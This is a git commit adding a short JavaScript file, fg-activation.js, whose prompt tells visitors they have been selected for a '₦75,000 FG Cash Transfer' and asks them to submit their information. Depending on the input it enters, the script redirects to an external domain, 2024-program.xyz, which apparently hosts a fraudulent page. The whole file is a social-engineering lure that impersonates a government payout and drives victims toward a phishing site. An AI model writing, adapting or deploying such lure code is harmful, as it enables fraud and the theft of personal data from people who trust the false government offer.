5987bfd7b29f9a81f4c2c3fafa219669fcae1e05
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-06-05 23:02:06 -0700

    Create fg-activation.js

---
+++ fg-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('FG: Congratulations, you are among the selected ones to receive the ₦75,000 FG Cash Transfer, kindly press 1 to submit your information now ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/75k-fg-cash-transfer.html';
+}
